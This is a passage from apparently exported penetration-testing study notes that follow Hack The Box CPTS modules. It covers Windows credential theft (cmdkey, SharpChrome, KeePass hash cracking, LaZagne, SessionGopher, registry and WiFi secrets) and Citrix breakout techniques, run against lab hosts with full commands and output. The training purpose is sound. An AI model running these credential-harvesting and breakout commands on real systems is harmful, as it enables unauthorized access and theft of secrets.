,\n\"DeletedAt\" bigint ,\n\"UpdatedAt\" bigint )'\nindexsqlite_autoindex_Note_1Note\naf907b1b-1eef-4d29-b238-3ea74f7ffe5caf907b1b-1eef-4d29-b238-3ea74f7ffe5c\nU\taf907b1b-1eef-4d29-b238-3ea74f7ffe5c\nYellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c\nU\t93b49900-6530-42e0-b35c-2663989ae4b3\n\n\n< SNIP >\n\n\\id=011f29a4-e37f-451d-967e-c42b818473c2 vCenter\n\\id=34910533-ddcf-4ac4-b8ed-3d1f10be9e61 alright*\n\\id=ffaea2ff-b4fc-4a14-a431-998dc833208c root:Vc3nt3R_adm1n!ManagedPosition=Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c\n\n<SNIP >\n```\n\n---\n\n## Other Files of Interest\n\n#### Other Interesting Files\n\nSome other files we may find credentials in include the following:\n\nOther Files\n\n```shell-session\n%SYSTEMDRIVE%\\pagefile.sys\n%WINDIR%\\debug\\NetSetup.log\n%WINDIR%\\repair\\sam\n%WINDIR%\\repair\\system\n%WINDIR%\\repair\\software, %WINDIR%\\repair\\security\n%WINDIR%\\iis6.log\n%WINDIR%\\system32\\config\\AppEvent.Evt\n%WINDIR%\\system32\\config\\SecEvent.Evt\n%WINDIR%\\system32\\config\\default.sav\n%WINDIR%\\system32\\config\\security.sav\n%WINDIR%\\system32\\config\\software.sav\n%WINDIR%\\system32\\config\\system.sav\n%WINDIR%\\system32\\CCM\\logs\\*.log\n%USERPROFILE%\\ntuser.dat\n%USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat\n%WINDIR%\\System32\\drivers\\etc\\hosts\nC:\\ProgramData\\Configs\\*\nC:\\Program Files\\Windows PowerShell\\*\n```\n\nSome of the privilege escalation enumeration scripts listed earlier in this module search for most, if not all, of the files/extensions mentioned in this section. Nevertheless, we must understand how to search for these manually and not only rely on tools. Furthermore, we may find interesting files that enumeration scripts do not look for and wish to modify the scripts to include them.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/24-Further Credential Theft",
    "path": "02_CPTS/17-Windows Privilege Escalation/24-Further Credential Theft.md",
    "title": "24 Further Credential Theft",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Further Credential Theft --- There are many other techniques we can use to potentially obtain credentials on a Windows system. This section will not cover every possible scenario, but we will walk thr...",
    "category": "02_CPTS",
    "content": "# Further Credential Theft\n\n---\n\nThere are many other techniques we can use to potentially obtain credentials on a Windows system. This section will not cover every possible scenario, but we will walk through the most common scenarios.\n\n---\n\n## Cmdkey Saved Credentials\n\n#### Listing Saved Credentials\n\nThe [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.\n\nFurther Credential Theft\n\n```cmd-session\nC:\\htb> cmdkey /list\n\n    Target: LegacyGeneric:target=TERMSRV/SQL01\n    Type: Generic\n    User: inlanefreight\\bob\n\t\n```\n\nWhen we attempt to RDP to the host, the saved credentials will be used.\n\n![Remote Desktop Connection window showing Computer: SQL01 and User name: inlanefreight\\bob. Options to edit or delete saved credentials. Connect and Help buttons visible.](https://academy.hackthebox.com/storage/modules/67/cmdkey_rdp.png)\n\nWe can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:\n\n#### Run Commands as Another User\n\nFurther Credential Theft\n\n```powershell-session\nPS C:\\htb> runas /savecred /user:inlanefreight\\bob \"COMMAND HERE\"\n```\n\n---\n\n## Browser Credentials\n\n#### Retrieving Saved Credentials from Chrome\n\nUsers often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.\n\nFurther Credential Theft\n\n```powershell-session\nPS C:\\htb> .\\SharpChrome.exe logins /unprotect\n\n  __                 _\n (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _\n __) | | (_| |  |_) \\_ | | | (_) | | | (/_\n                |\n  v1.7.0\n\n\n[*] Action: Chrome Saved Logins Triage\n\n[*] Triaging Chrome Logins for current user\n\n\n\n[*] AES state key file : C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Local State\n[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0\n\n\n--- Chrome Credential (Path: C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data) ---\n\nfile_path,signon_realm,origin_url,date_created,times_used,username,password\nC:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1\n```\n\nNote: Credential collection from Chromium-based browsers generates additional events that could be logged and identified as `4983`, `4688`, and `16385`, and monitored by the blue team.\n\n---\n\n## Password Managers\n\nMany companies provide password managers to their users. This may be in the form of a desktop application such as `KeePass`, a cloud-based solution such as `1Password`, or an enterprise password vault such as `Thycotic` or `CyberArk`. Gaining access to a password manager, especially one utilized by a member of the IT staff or an entire department, may lead to administrator-level access to high-value targets such as network devices, servers, databases, etc. We may gain access to a password vault through password reuse or guessing a weak/common password. Some password managers such as `KeePass` are stored locally on the host. If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password. If we can download a `.kdbx` file to our attacking host, we can use a tool such as [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) to extract the password hash and run it through a password cracking tool such as [Hashcat](https://github.com/hashcat) or [John the Ripper](https://github.com/openwall/john).\n\n#### Extracting KeePass Hash\n\nFirst, we extract the hash in Hashcat format using the `keepass2john.py` script.\n\nFurther Credential Theft\n\n```shell-session\ndrxh3kr@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx \n\nILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154\n```\n\n#### Cracking Hash Offline\n\nWe can then feed the hash to Hashcat, specifying [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 for KeePass. If successful, we may gain access to a wealth of credentials that can be used to access other applications/systems or even network devices, servers, databases, etc., if we can gain access to a password database used by IT staff.\n\nFurther Credential Theft\n\n```shell-session\ndrxh3kr@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt\n\nhashcat (v6.1.1) starting...\n\n<SNIP>\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\n$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)\nHash.Target......: $keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d...39c154\nTime.Started.....: Fri Aug  6 11:17:47 2021 (22 secs)\nTime.Estimated...: Fri Aug  6 11:18:09 2021 (0 secs)\nGuess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:      276 H/s (4.79ms) @ Accel:1024 Loops:16 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 6144/14344385 (0.04%)\nRejected.........: 0/6144 (0.00%)\nRestore.Point....: 0/14344385 (0.00%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59984-60000\nCandidates.#1....: 123456 -> iheartyou\n\nStarted: Fri Aug  6 11:17:45 2021\nStopped: Fri Aug  6 11:18:11 2021\n```\n\n---\n\n## Email\n\nIf we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as \"pass,\" \"creds,\" \"credentials,\" etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).\n\n---\n\n## More Fun with Credentials\n\nWhen all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.). The tool can be used to run all modules, specific modules (such as databases), or against a particular piece of software (i.e., OpenVPN). The output can be saved to a standard text file or in JSON format. Let's take it for a spin.\n\n#### Viewing LaZagne Help Menu\n\nWe can view the help menu with the `-h` flag.\n\nFurther Credential Theft\n\n```powershell-session\nPS C:\\htb> .\\lazagne.exe -h\n\nusage: lazagne.exe [-h] [-version]\n                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}\n                   ...\n\t\t\t\t   \n|====================================================================|\n|                                                                    |\n|                        The LaZagne Project                         |\n|                                                                    |\n|                          ! BANG BANG !                             |\n|                                                                    |\n|====================================================================|\n\npositional arguments:\n  {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}\n                        Choose a main command\n    chats               Run chats module\n    mails               Run mails module\n    all                 Run all modules\n    git                 Run git module\n    svn                 Run svn module\n    windows             Run windows module\n    wifi                Run wifi module\n    maven               Run maven module\n    sysadmin            Run sysadmin module\n    browsers            Run browsers module\n    games               Run games module\n    multimedia          Run multimedia module\n    memory              Run memory module\n    databases           Run databases module\n    php                 Run php module\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -version              laZagne version\n```\n\n#### Running All LaZagne Modules\n\nAs we can see, there are many modules available to us. Running the tool with `all` will search for supported applications and return any discovered cleartext credentials. As we can see from the example below, many applications do not store credentials securely (best never to store credentials, period!). They can easily be retrieved and used to escalate privileges locally, move on to another system, or access sensitive data.\n\nFurther Credential Theft\n\n```powershell-session\nPS C:\\htb> .\\lazagne.exe all\n\n|====================================================================|\n|                                                                    |\n|                        The LaZagne Project                         |\n|                                                                    |\n|                          ! BANG BANG !                             |\n|                                                                    |\n|====================================================================|\n\n########## User: jordan ##########\n\n------------------- Winscp passwords -----------------\n\n[+] Password found !!!\nURL: transfer.inlanefreight.local\nLogin: root\nPassword: Summer2020!\nPort: 22\n\n------------------- Credman passwords -----------------\n\n[+] Password found !!!\nURL: dev01.dev.inlanefreight.local\nLogin: jordan_adm\nPassword: ! Q A Z z a q 1\n\n[+] 2 passwords have been found.\n\nFor more information launch it again with the -v option\n\nelapsed time = 5.50499987602\n```\n\n---\n\n## Even More Fun with Credentials\n\nWe can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely. It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. It can also be run to search drives for PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid) files.\n\n#### Running SessionGopher as Current User\n\nWe need local admin access to retrieve stored session information for every user in `HKEY_USERS`, but it is always worth running as our current user to see if we can find any useful credentials.\n\nFurther Credential Theft\n\n```powershell-session\nPS C:\\htb> Import-Module .\\SessionGopher.ps1\n \nPS C:\\Tools> Invoke-SessionGopher -Target WINLPE-SRV01\n \n          o_\n         /  \".   SessionGopher\n       ,\"  _-\"\n     ,\"   m m\n  ..+     )      Brandon Arvanaghi\n     `m..m       Twitter: @arvanaghi | arvanaghi.com\n \n[+] Digging on WINLPE-SRV01...\nWinSCP Sessions\n \n \nSource   : WINLPE-SRV01\\htb-student\nSession  : Default%20Settings\nHostname :\nUsername :\nPassword :\n \n \nPuTTY Sessions\n \n \nSource   : WINLPE-SRV01\\htb-student\nSession  : nix03\nHostname : nix03.inlanefreight.local\n \n\n \nSuperPuTTY Sessions\n \n \nSource        : WINLPE-SRV01\\htb-student\nSessionId     : NIX03\nSessionName   : NIX03\nHost          : nix03.inlanefreight.local\nUsername      : srvadmin\nExtraArgs     :\nPort          : 22\nPutty Session : Default Settings\n```\n\n---\n\n## Clear-Text Password Storage in the Registry\n\nCertain programs and windows configurations can result in clear-text passwords or other data being stored in the registry. While tools such as `Lazagne` and `SessionGopher` are a great way to extract credentials, as penetration testers we should also be familiar and comfortable with enumerating them manually.\n\n### Windows AutoLogon\n\nWindows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup. However, once this is configured, the username and password are stored in the registry, in clear-text. This feature is commonly used on single-user systems or in situations where convenience outweighs the need for enhanced security.\n\nThe registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users:\n\nCode: cmd\n\n```cmd\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n```\n\nThe typical configuration of an Autologon account involves the manual setting of the following registry keys:\n\n- `AdminAutoLogon` - Determines whether Autologon is enabled or disabled. A value of \"1\" means it is enabled.\n- `DefaultUserName` - Holds the value of the username of the account that will automatically log on.\n- `DefaultPassword` - Holds the value of the password for the user account specified previously.\n\n#### Enumerating Autologon with reg.exe\n\nFurther Credential Theft\n\n```cmd-session\nC:\\htb>reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n    AutoRestartShell    REG_DWORD    0x1\n    Background    REG_SZ    0 0 0\n    \n    <SNIP>\n    \n    AutoAdminLogon    REG_SZ    1\n    DefaultUserName    REG_SZ    htb-student\n    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!\n```\n\n**`Note:`** If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.\n\n### Putty\n\nFor Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.\n\nCode: cmd\n\n```cmd\nComputer\\HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\<SESSION NAME>\n```\n\nNote that the access controls for this specific registry key are tied to the user account that configured and saved the session. Therefore, in order to see it, we would need to be logged in as that user and search the `HKEY_CURRENT_USER` hive. Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in `HKEY_USERS`.\n\n#### Enumerating Sessions and Finding Credentials:\n\nFirst, we need to enumerate the available saved sessions:\n\nFurther Credential Theft\n\n```powershell-session\nPS C:\\htb> reg query HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\n\nHKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\kali%20ssh\n```\n\nNext, we look at the keys and values of the discovered session \"`kali%20ssh`\":\n\nFurther Credential Theft\n\n```powershell-session\nPS C:\\htb> reg query HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\kali%20ssh\n\nHKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\kali%20ssh\n    Present    REG_DWORD    0x1\n    HostName    REG_SZ\n    LogFileName    REG_SZ    putty.log\n    \n  <SNIP>\n  \n    ProxyDNS    REG_DWORD    0x1\n    ProxyLocalhost    REG_DWORD    0x0\n    ProxyMethod    REG_DWORD    0x5\n    ProxyHost    REG_SZ    proxy\n    ProxyPort    REG_DWORD    0x50\n    ProxyUsername    REG_SZ    administrator\n    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!    \n```\n\nIn this example, we can imagine the scenario that the IT administrator has configured Putty for a user in their environment, but unfortunately used their admin credentials in the proxy connection. The password could be extracted and potentially reused across the network.\n\nFor additional information on `reg.exe` and working with the registry, be sure to check out the [Introduction to Windows Command Line](https://academy.hackthebox.com/module/167/section/1623) module.\n\n---\n\n## Wifi Passwords\n\n#### Viewing Saved Wireless Networks\n\nIf we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.\n\nFurther Credential Theft\n\n```cmd-session\nC:\\htb> netsh wlan show profile\n\nProfiles on interface Wi-Fi:\n\nGroup policy profiles (read only)\n---------------------------------\n    <None>\n\nUser profiles\n-------------\n    All User Profile     : Smith Cabin\n    All User Profile     : Bob's iPhone\n    All User Profile     : EE_Guest\n    All User Profile     : EE_Guest 2.4\n    All User Profile     : ilfreight_corp\n```\n\n#### Retrieving Saved Wireless Passwords\n\nDepending on the network configuration, we can retrieve the pre-shared key (`Key Content` below) and potentially access the target network. While rare, we may encounter this during an engagement and use this access to jump onto a separate wireless network and gain access to additional resources.\n\nFurther Credential Theft\n\n```cmd-session\nC:\\htb> netsh wlan show profile ilfreight_corp key=clear\n\nProfile ilfreight_corp on interface Wi-Fi:\n=======================================================================\n\nApplied: All User Profile\n\nProfile information\n-------------------\n    Version                : 1\n    Type                   : Wireless LAN\n    Name                   : ilfreight_corp\n    Control options        :\n        Connection mode    : Connect automatically\n        Network broadcast  : Connect only if this network is broadcasting\n        AutoSwitch         : Do not switch to other networks\n        MAC Randomization  : Disabled\n\nConnectivity settings\n---------------------\n    Number of SSIDs        : 1\n    SSID name              : \"ilfreight_corp\"\n    Network type           : Infrastructure\n    Radio type             : [ Any Radio Type ]\n    Vendor extension          : Not present\n\nSecurity settings\n-----------------\n    Authentication         : WPA2-Personal\n    Cipher                 : CCMP\n    Authentication         : WPA2-Personal\n    Cipher                 : GCMP\n    Security key           : Present\n    Key Content            : ILFREIGHTWIFI-CORP123908!\n\nCost settings\n-------------\n    Cost                   : Unrestricted\n    Congested              : No\n    Approaching Data Limit : No\n    Over Data Limit        : No\n    Roaming                : No\n    Cost Source            : Default\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/25-Citrix Breakout",
    "path": "02_CPTS/17-Windows Privilege Escalation/25-Citrix Breakout.md",
    "title": "25 Citrix Breakout",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Citrix Breakout --- Numerous organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer remote access solutions in order to meet ...",
    "category": "02_CPTS",
    "content": "# Citrix Breakout\n\n---\n\nNumerous organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer remote access solutions in order to meet their business requirements. However, in most organizations \"lock-down\" measures are implemented in their desktop environments to minimize the potential impact of malicious staff members and compromised accounts on overall domain security. While these desktop restrictions can impede threat actors, there remains a possibility for them to \"break-out\" of the restricted environment.\n\n---\n\nBasic Methodology for break-out:\n\n1. Gain access to a `Dialog Box`.\n2. Exploit the Dialog Box to achieve `command execution`.\n3. `Escalate privileges` to gain higher levels of access.\n\n---\n\nIn certain environments, where minimal hardening measures are implemented, there might even be a standard shortcut to `cmd.exe` in the Start Menu, potentially aiding in unauthorized access. However, in a highly restrictive `lock-down` environment, any attempts to locate \"cmd.exe\" or \"powershell.exe\" in the start menu will yield no results. Similarly, accessing `C:\\Windows\\system32` through File Explorer will trigger an error, preventing direct access to critical system utilities. Acquiring access to the \"CMD/Command Prompt\" in such a restricted environment represents a notable achievement, as it provides extensive control over the Operating System. This level of control empowers an attacker to gather valuable information, facilitating the further escalation of privileges.\n\nThere are many techniques which can be used for breaking out of a Citrix environment. This section will not cover every possible scenario, but we will walk through the most common ways to perform a Citrix breakout.\n\nVisit `http://humongousretail.com/remote/` using the RDP session of the spawned target and login with the provided credentials below. After login, click on the `Default Desktop` to obtain the Citrix `launch.ica` file in order to connect to the restricted environment.\n\nCode: citrixcredentials\n\n```citrixcredentials\nUsername: pmorgan\nPassword: Summer1Summer!\n  Domain: htb.local\n```\n\n---\n\n## Bypassing Path Restrictions\n\nWhen we attempt to visit `C:\\Users` using File Explorer, we find it is restricted and results in an error. This indicates that group policy has been implemented to restrict users from browsing directories in the `C:\\` drive using File Explorer. In such scenarios, it is possible to utilize windows dialog boxes as a means to bypass the restrictions imposed by group policy. Once a Windows dialog box is obtained, the next step often involves navigating to a folder path containing native executables that offer interactive console access (i.e.: cmd.exe). Usually, we have the option to directly enter the folder path into the file name field to gain access to the file.\n\n![Windows Explorer window with error message: 'Accessing the resource 'C:\\Users' has been disallowed.' OK button visible.](https://academy.hackthebox.com/storage/modules/67/C_users_restricted.png)\n\nNumerous desktop applications deployed via Citrix are equipped with functionalities that enable them to interact with files on the operating system. Features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an attacker with an opportunity to invoke a Windows dialog box. There are multiple ways to open dialog box in windows using tools such as Paint, Notepad, Wordpad, etc. We will cover using `MS Paint` as an example for this section.\n\nRun `Paint` from start menu and click on `File > Open` to open the Dialog Box.\n\n![Microsoft Paint window with the File menu open. Options include New, Open (highlighted), Save, Save as, Print, Send in e-mail, and Set as desktop background.](https://academy.hackthebox.com/storage/modules/67/paint.png)\n\nWith the windows dialog box open for paint, we can enter the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path `\\\\127.0.0.1\\c$\\users\\pmorgan` under the File name field, with File-Type set to `All Files` and upon hitting enter we gain access to the desired directory.\n\n![File Explorer window open to Downloads folder, showing a single file named flag.txt. File path is \\127.0.0.1\\c$\\users\\pmorgan\\Downloads. Open and Cancel buttons visible.](https://academy.hackthebox.com/storage/modules/67/paint_flag.png)\n\n---\n\n## Accessing SMB share from restricted environment\n\nHaving restrictions set, File Explorer does not allow direct access to SMB shares on the attacker machine, or the Ubuntu server hosting the Citrix environment. However, by utilizing the UNC path within the Windows dialog box, it's possible to circumvent this limitation. This approach can be employed to facilitate file transfers from a different computer.\n\nStart a SMB server from the Ubuntu machine using Impacket's `smbserver.py` script.\n\nCitrix Breakout\n\n```shell-session\nroot@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)\n\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\nBack in the Citrix environment, initiate the \"Paint\" application via the start menu. Proceed to navigate to the \"File\" menu and select \"Open\", thereby prompting the Dialog Box to appear. Within this Windows dialog box associated with Paint, input the UNC path as `\\\\10.13.38.95\\share` into the designated \"File name\" field. Ensure that the File-Type parameter is configured to \"All Files.\" Upon pressing the \"Enter\" key, entry into the share is achieved.\n\n![File Explorer window open to network share at \\10.13.38.95\\share. Files listed: Bypass-UAC.ps1, Explorer++.exe, PowerUp.ps1, pwn.c, pwn.exe. Open and Cancel buttons visible.](https://academy.hackthebox.com/storage/modules/67/paint_share.png)\n\nDue to the presence of restrictions within the File Explorer, direct file copying is not viable. Nevertheless, an alternative approach involves `right-clicking` on the executables and subsequently launching them. Right-click on the `pwn.exe` binary and select `Open`, which should prompt us to run it and a cmd console will be opened.\n\n![Command prompt running pwn.exe from network share \\10.13.38.95\\share. Message indicates CMD.EXE started with UNC path, defaulting to Windows directory. Windows version 6.1.7601 displayed.](https://academy.hackthebox.com/storage/modules/67/pwn_cmd.png)\n\nThe executable `pwn.exe` is a custom compiled binary from `pwn.c` file which upon execution opens up the cmd.\n\nCode: c\n\n```c\n#include <stdlib.h>\nint main() {\n  system(\"C:\\\\Windows\\\\System32\\\\cmd.exe\");\n}\n```\n\nWe can then use the obtained cmd access to copy files from SMB share to pmorgans Desktop directory.\n\n![Command prompt showing PowerShell command to bypass execution policy. File Bypass-UAC.ps1 copied from network share. Directory listing shows Bypass-UAC.ps1, evil.bat, and My_Shortcut.lnk on Desktop.](https://academy.hackthebox.com/storage/modules/67/xcopy.png)\n\n---\n\n## Alternate Explorer\n\nIn cases where strict restrictions are imposed on File Explorer, alternative File System Editors like `Q-Dir` or `Explorer++` can be employed as a workaround. These tools can bypass the folder restrictions enforced by group policy, allowing users to navigate and access files and directories that would otherwise be restricted within the standard File Explorer environment.\n\nIt's worth noting the previous inability of File Explorer to copy files from the SMB share due to restrictions in place. However, through the utilization of `Explorer++`, the capability to copy files from the `\\\\10.13.38.95\\share` location to the Desktop belonging to the user `pmorgan` has been successfully demonstrated in following screenshot.\n\n![File Explorer window showing Desktop folder with files: Bypass-UAC.ps1, desktop.ini, Explorer++, My_Shortcut, PowerUp.ps1, pwn.c, and pwn.exe.](https://academy.hackthebox.com/storage/modules/67/Explorer++.png)\n\n[Explorer++](https://explorerplusplus.com/) is highly recommended and frequently used in such situations due to its speed, user-friendly interface, and portability. Being a portable application, it can be executed directly without the need for installation, making it a convenient choice for bypassing folder restrictions set by group policy.\n\n---\n\n## Alternate Registry Editors\n\n![Small Registry Editor window showing registry keys: HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, and HKEY_CURRENT_CONFIG. HKEY_CURRENT_CONFIG is selected, displaying default string value not set.](https://academy.hackthebox.com/storage/modules/67/smallregistry.png)\n\nSimilarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy. These tools offer a practical and effective solution for managing registry settings in such restricted environments.\n\n---\n\n## Modify existing shortcut file\n\nUnauthorized access to folder paths can also be achieved by modifying existing Windows shortcuts and setting a desired executable's path in the `Target` field.\n\nThe following steps outline the process:\n\n1. `Right-click` the desired shortcut.\n    \n2. Select `Properties`. ![File Explorer window showing Desktop folder. Context menu open for 'My_Shortcut' with options like Open, Copy, Delete, and Properties. Shortcut size is 979 bytes.](https://academy.hackthebox.com/storage/modules/67/shortcut_1.png)\n    \n3. Within the `Target` field, modify the path to the intended folder for access. ![File Explorer window showing Desktop folder. 'My_Shortcut' properties open, displaying target type as File folder, target location as Users, and target as C:\\Windows\\System32\\cmd.exe.](https://academy.hackthebox.com/storage/modules/67/shortcut_2.png)\n    \n4. Execute the Shortcut and cmd will be spawned ![Command prompt window titled 'My_Shortcut' showing Windows version 6.1.7601. Path displayed as C:\\Users\\pmorgan\\Desktop.](https://academy.hackthebox.com/storage/modules/67/shortcut_3.png)\n    \n\nIn cases where an existing shortcut file is unavailable, there are alternative methods to consider. One option is to transfer an existing shortcut file using an SMB server. Alternatively, we can create a new shortcut file using PowerShell as mentioned under [Interacting with Users section](https://academy.hackthebox.com/module/67/section/630) under `Generating a Malicious .lnk File` tab. These approaches provide versatility in achieving our objectives while working with shortcut files.\n\n---\n\n## Script Execution\n\nWhen script extensions such as `.bat`, `.vbs`, or `.ps` are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place. This situation creates a potential security vulnerability where malicious actors could exploit these features to execute unauthorized actions on the system.\n\n1. Create a new text file and name it \"evil.bat\".\n2. Open \"evil.bat\" with a text editor such as Notepad.\n3. Input the command \"cmd\" into the file. ![File Explorer window showing Desktop folder. Notepad open with file 'evil.bat' containing the text 'cmd'. File size is 3 bytes.](https://academy.hackthebox.com/storage/modules/67/script_bat.png)\n4. Save the file.\n\nUpon executing the \"evil.bat\" file, it will initiate a Command Prompt window. This can be useful for performing various command-line operations.\n\n---\n\n## Escalating Privileges\n\nOnce access to the command prompt is established, it's possible to search for vulnerabilities in a system more easily. For instance, tools like [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) can also be employed to identify potential security issues and vulnerabilities within the operating system.\n\nUsing `PowerUp.ps1`, we find that [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) key is present and set.\n\nWe can also validate this using the Command Prompt by querying the corresponding registry keys:\n\nCitrix Breakout\n\n```cmd-session\nC:\\> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\nHKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n\t\tAlwaysInstallElevated    REG_DWORD    0x1\n\n\nC:\\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v 